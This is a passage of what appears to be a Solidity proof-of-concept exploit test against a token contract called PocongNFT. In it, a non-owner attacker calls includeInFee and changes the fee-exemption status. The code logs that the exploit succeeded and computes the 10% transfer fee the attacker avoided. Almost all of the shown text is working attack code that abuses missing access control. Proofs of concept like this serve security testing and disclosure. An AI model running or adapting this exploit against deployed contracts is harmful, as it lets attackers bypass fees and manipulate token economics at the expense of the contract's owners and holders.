        PocongNFT(TARGET).includeInFee(attacker);

        isExcluded = PocongNFT(TARGET).isExcludedFromFee(attacker);
        console.log("Is attacker excluded from fee after include?", isExcluded);
        require(!isExcluded, "Attacker should NOT be excluded from fee after includeInFee");

        console.log("\nExploit successful: Attacker can manipulate fee exemptions without being owner!");

        // The economic benefit: We avoided 10% fee on the transfer
        // Normally we would lose 10 tokens as fee, but we lost 0
        uint256 feeSaved = transferAmount - recipientGained;
        console.log("Fee saved:", feeSaved, "tokens");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
